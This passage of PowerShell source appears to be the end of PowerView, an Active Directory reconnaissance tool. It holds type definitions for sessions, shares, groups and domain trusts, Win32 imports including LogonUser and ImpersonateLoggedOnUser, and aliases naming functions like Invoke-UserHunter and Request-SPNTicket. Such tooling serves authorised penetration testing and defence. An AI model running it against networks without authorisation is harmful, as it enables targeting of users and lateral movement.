# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]

# used to parse the 'samAccountType' property for users/computers/groups
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# used to parse the 'grouptype' property for groups
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# used to parse the 'userAccountControl' property for users/groups
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# enum used by $WTS_SESSION_INFO_1 below
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# enum used by $LOCALGROUP_MEMBERS_INFO_2 below
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# the NetLocalGroupEnum result structure
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

# the NetLocalGroupGetMembers result structure
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

# enums used in DS_DOMAIN_TRUSTS
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# the DsEnumerateDomainTrusts result structure
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# used by WNetAddConnection2W
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
